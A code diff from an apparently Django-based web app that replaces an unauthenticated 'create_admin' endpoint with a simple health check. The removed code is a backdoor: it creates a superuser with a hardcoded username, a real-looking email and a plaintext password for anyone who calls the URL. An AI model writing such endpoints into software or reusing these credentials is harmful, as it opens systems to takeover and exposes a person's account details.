@@ -1225,15 +1225,5 @@ def generate_invoice(request, order_id):
     return response
 
 
-@api_view(["GET"])
-def create_admin(request):
-    User = get_user_model()
-
-    if not User.objects.filter(username="admin").exists():
-        User.objects.create_superuser(
-            username="antony",
-            email="antonyvenis1212@gmail.com",
-            password="Venisking@419"
-        )
-
-    return Response({"message": "Admin created"})
+def health_check(request):
+    return Response({"status": "ok"})
